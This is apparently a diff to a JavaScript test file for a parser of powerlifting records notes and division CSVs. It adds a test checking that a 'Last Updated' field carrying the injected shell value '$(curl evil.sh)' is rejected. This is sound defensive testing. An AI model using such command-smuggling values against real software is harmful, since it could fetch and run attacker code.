@@ -12,6 +12,12 @@ test('parseNotes', () => {
 	assert.match(n.notes[3], /^Sub-Junior lifters are allowed to break Junior records/);
 });
 
+test('parseNotes rejects a Last Updated value that is not a plain date', () =>
+	assert.throws(
+		() => parseNotes(read('notes.csv').replace('July 13, 2026', 'July 13, 2026 $(curl evil.sh)')),
+		/Last Updated/,
+	));
+
 test('parseDivision: men open', () => {
 	const d = parseDivision(read('m-open.csv'));
 	assert.equal(d.squat.length, 8);
